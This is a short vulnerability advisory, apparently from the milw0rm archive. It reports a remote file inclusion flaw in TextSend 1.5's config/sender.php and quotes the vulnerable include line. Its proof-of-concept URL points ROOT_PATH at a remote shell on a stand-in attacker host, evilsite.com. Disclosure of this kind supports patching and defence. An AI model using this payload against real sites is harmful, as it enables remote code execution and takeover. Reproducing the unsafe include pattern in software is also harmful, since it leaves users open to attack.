@@ -1,0 +1,24 @@
++-------------------------------------------------------------------------------------------
++ TextSend <= 1.5 (config/sender.php) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Vendor ............: http://www.textsend.info/
++ Affected Software .: TextSend <= 1.5
++ Download ..........: http://www.textsend.info/download/TextSendv1.5.zip
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ TextSend config/sender.php does not initialize the $ROOT_PATH variable before using it to
++ include files, assuming register_globals = on, we can initialize the variable in a query
++ string and include a remote file of our choice.
++
++ Vulnerable Code:
++ config/sender.php, line(s) 10:
++ -> include ("$ROOT_PATH/config.php");
++
++ Proof Of Concept:
++ http://[target]/[path]/config/sender.php?ROOT_PATH=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-20]
